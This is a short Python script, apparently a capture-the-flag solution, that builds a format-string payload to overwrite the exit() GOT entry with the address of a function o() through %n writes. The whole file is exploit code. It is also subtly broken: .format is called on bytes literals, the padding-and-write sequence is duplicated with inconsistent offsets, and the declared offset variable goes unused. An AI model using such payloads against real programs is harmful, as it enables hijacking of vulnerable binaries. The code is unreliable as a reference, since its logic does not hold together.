import struct

exit_got_address = 0x08049828  # Address of the exit GOT entry
target_address = 0x080484a4    # Address of the o() function
offset = 3                     # Offset calculated


payload = b''
payload += struct.pack('<I', exit_got_address)  # Address of exit in GOT
payload += struct.pack('<I', exit_got_address+2)  # Address of exit+2 in GOT
payload += b'%{}x'.format((target_address & 0xffff) - 8).zfill(8)  # First write
payload += b'%{}x'.format(((target_address >> 16) & 0xffff) - (target_address & 0xffff)).zfill(8)  # Second write
payload += b'%8$n'  # Write the first half
payload += b'%{}x'.format((target_address & 0xffff) - 12).zfill(8)  # First write
payload += b'%{}x'.format(((target_address >> 16) & 0xffff) - (target_address & 0xffff)).zfill(8)  # Second write
payload += b'%9$n'  # Write the second half

print(payload)